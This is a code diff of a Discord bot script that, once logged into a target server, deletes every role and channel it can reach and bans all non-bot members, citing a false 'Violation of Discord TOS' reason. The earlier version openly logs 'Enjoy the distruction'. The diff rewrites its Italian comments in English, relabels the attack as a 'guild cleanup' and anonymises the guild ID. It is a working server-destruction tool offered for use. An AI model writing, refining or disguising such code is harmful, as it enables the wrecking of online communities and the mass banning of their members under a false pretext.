@@ -1,76 +1,88 @@
+// Import required classes and functions from the Discord.js library
 const { Client, GatewayIntentBits } = require('discord.js');
+// Import the bot token from the configuration file
 const { token } = require('./config.json');
 
-// Create a new client instance
-const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
-const guildId = "755484634640416848";
+// Create a new Discord client instance with specific intents
+const client = new Client({ 
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] 
+});
 
+// Define the ID of the target guild (replace "GUILD ID" with the actual ID)
+const guildId = "GUILD ID";
+
+/**
+ * Utility function to pause execution for a specified amount of time
+ * @param {number} ms - Time to sleep in milliseconds
+ * @returns {Promise<void>}
+ */
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+// Event listener triggered when the bot is ready
 client.once('ready', async () => {
-    console.log(`Ready! Enjoy the distruction 👀`);
+    console.log(`Bot is ready! Time to clean up the guild. 🚀`);
 
-    const guild = await client.guilds.fetch(guildId);
-    console.log(guild.name);
     try {
-        // Fetch dei ruoli direttamente dalla guild
+        // Fetch the guild by its ID
+        const guild = await client.guilds.fetch(guildId);
+        console.log(`Connected to guild: ${guild.name}`);
+
+        // --- Delete Roles ---
         const roles = await guild.roles.fetch();
         const botHighestRole = guild.members.me.roles.highest;
 
-        // Elimina tutti i ruoli (tranne ruoli di sistema e il ruolo @everyone)
         for (const role of roles.values()) {
+            // Skip managed roles, the @everyone role, or roles above the bot's highest role
             if (!role.managed && role.name !== '@everyone' && role.comparePositionTo(botHighestRole) < 0) {
-                await sleep(1000); // Sleep di 1 secondo tra le eliminazioni
+                await sleep(1000); // 1-second delay between deletions
                 try {
                     await role.delete();
-                    console.log(`Ruolo eliminato: ${role.name}`);
+                    console.log(`Role deleted: ${role.name}`);
                 } catch (error) {
-                    console.error(`Errore nell'eliminare il ruolo ${role.name}`);
+                    console.error(`Failed to delete role: ${role.name}`, error);
                 }
             }
         }
+        console.log("All eligible roles have been deleted!");
 
-        console.log("Tutti i ruoli sono stati eliminati!");
-
-        // Fetch dei canali direttamente dalla guild
+        // --- Delete Channels ---
         const channels = await guild.channels.fetch();
 
-        // Elimina tutti i canali
         for (const channel of channels.values()) {
+            await sleep(2000); // 2-second delay between deletions
             try {
-                await sleep(2000); // Sleep di 1 secondo tra le eliminazioni
                 await channel.delete();
-                console.log(`Canale eliminato: ${channel.name}`);
+                console.log(`Channel deleted: ${channel.name}`);
             } catch (error) {
-                console.error(`Errore nell'eliminare il canale ${channel.name}`);
+                console.error(`Failed to delete channel: ${channel.name}`, error);
             }
         }
+        console.log("All channels have been deleted!");
 
-        console.log("Tutti i canali sono stati eliminati!");
-
-        // Fetch dei membri direttamente dalla guild
+        // --- Ban Members ---
         const members = await guild.members.fetch();
 
-        // Banna tutti i membri
         for (const member of members.values()) {
-            try {
-                await sleep(2000); // Sleep di 1 secondo tra i ban
-                await member.ban({ reason: 'Violazione dei TOS di Discord.' });
-                console.log(`Membro bannato: ${member.user.tag}`);
-            } catch (error) {
-                console.error(`Errore nel bannare il membro ${member.user.tag}`);
+            if (!member.user.bot) { // Skip bots
+                await sleep(2000); // 2-second delay between bans
+                try {
+                    await member.ban({ reason: 'Violation of Discord TOS' });
+                    console.log(`Member banned: ${member.user.tag}`);
+                } catch (error) {
+                    console.error(`Failed to ban member: ${member.user.tag}`, error);
+                }
             }
         }
+        console.log("All non-bot members have been banned!");
 
-        console.log("Tutti i membri sono stati bannati!");
+        // Disconnect the bot after cleanup
         client.destroy();
-
     } catch (error) {
-        console.error(`Errore nel fetch dei ruoli, canali o membri`);
+        console.error("An error occurred during the guild cleanup process:", error);
     }
 });
 
-// Log in to Discord with your client's token
+// Log in to Discord with the bot's token
 client.login(token);
